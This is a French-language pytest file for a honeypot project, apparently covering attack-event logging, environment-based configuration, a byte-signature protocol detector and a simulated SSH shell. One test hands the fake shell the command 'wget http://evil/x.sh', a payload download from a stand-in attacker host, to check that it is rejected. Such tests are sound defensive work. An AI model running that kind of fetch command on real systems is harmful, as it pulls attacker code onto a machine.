"""Tests unitaires : logique locale, sans réseau."""
import json

import pytest

from src.core import config
from src.core.detecteur_payload import detecter_protocole
from src.core.gestionnaire_logs import enregistrer_attaque, formater_evenement
from src.services.honeypot_ssh import executer_commande_simulee


# ---------- gestionnaire_logs ----------

def test_formater_evenement_json_valide():
    evenement = formater_evenement("FTP_AUTH", "1.2.3.4", 4242, {"pass": "é\"x"})
    #l'événement doit pouvoir être sérialisé puis relu à l'identique
    relu = json.loads(json.dumps(evenement, ensure_ascii=False))
    assert relu["protocole"] == "FTP_AUTH"
    assert relu["ip_source"] == "1.2.3.4"
    assert relu["port_source"] == 4242
    assert relu["donnees"] == {"pass": "é\"x"}
    assert "horodatage" in relu


def test_enregistrer_attaque_ecrit_une_ligne_jsonl(tmp_path, monkeypatch):
    journal = tmp_path / "sous_dossier" / "events.jsonl"
    monkeypatch.setenv("LOG_FILE", str(journal))

    enregistrer_attaque("HTTP", "9.9.9.9", 1111, {"chemin": "/.env"})
    enregistrer_attaque("SSH_CMD", "9.9.9.9", 1112, {"commande": "id"})

    lignes = journal.read_text(encoding="utf-8").splitlines()
    assert len(lignes) == 2
    assert [json.loads(l)["protocole"] for l in lignes] == ["HTTP", "SSH_CMD"]


# ---------- config ----------

def test_port_service_lit_l_environnement(monkeypatch):
    monkeypatch.setenv("PORT_SSH", "2299")
    assert config.port_service("SSH") == 2299


def test_port_service_valeur_par_defaut(monkeypatch):
    monkeypatch.delenv("PORT_FTP", raising=False)
    assert config.port_service("FTP") == 2121


def test_hote_ecoute_par_defaut_toutes_interfaces(monkeypatch):
    monkeypatch.delenv("BIND_HOST", raising=False)
    #0.0.0.0 et non 127.0.0.1, sinon Docker ne peut pas router le trafic
    assert config.hote_ecoute() == "0.0.0.0"


def test_option_active(monkeypatch):
    monkeypatch.setenv("MUX_ENABLED", "false")
    assert config.option_active("MUX_ENABLED") is False
    monkeypatch.setenv("MUX_ENABLED", "True")
    assert config.option_active("MUX_ENABLED") is True


# ---------- détecteur de payload ----------

@pytest.mark.parametrize(
    "octets, attendu",
    [
        (b"SSH-2.0-OpenSSH_8.9\r\n", "SSH"),
        (b"GET /wp-login.php HTTP/1.1\r\nHost: x\r\n\r\n", "HTTP"),
        (b"POST /login HTTP/1.1\r\n", "HTTP"),
        (b"*1\r\n$4\r\nPING\r\n", "REDIS"),
        (b"INFO\r\n", "REDIS"),
        (b"USER anonymous\r\n", "FTP"),
        (b"AUTH TLS\r\n", "FTP"),
        (b"EHLO scanner.local\r\n", "SMTP"),
        (b"CAPA\r\n", "POP3"),
        (b"\x16\x03\x01\x02\x00\x01\x00", "TLS"),
        (b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00", "RDP"),
        (b"\xff\xfd\x18\xff\xfd\x20", "TELNET"),
        (b"\x00\x00\x00\x08\x04\xd2\x16\x2f", "POSTGRESQL"),
        (b"\x00\x00\x00\x08\x00\x03\x00\x00", "POSTGRESQL"),
        (b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03", "LDAP"),
    ],
)
def test_detecteur_reconnait_les_protocoles(octets, attendu):
    assert detecter_protocole(octets) == attendu


@pytest.mark.parametrize("octets", [b"", b"\x00\x01\x02\x03", b"bonjour tout le monde", b"HELLO"])
def test_detecteur_renvoie_none_si_inconnu(octets):
    assert detecter_protocole(octets) is None


def test_detecteur_insensible_a_la_casse_pour_les_commandes_texte():
    assert detecter_protocole(b"get / HTTP/1.0\r\n") == "HTTP"
    assert detecter_protocole(b"ping\r\n") == "REDIS"


# ---------- ssh simulé ----------

def test_ssh_simule_commande_connue_et_inconnue():
    assert executer_commande_simulee("whoami") == "root"
    assert "command not found" in executer_commande_simulee("wget http://evil/x.sh")
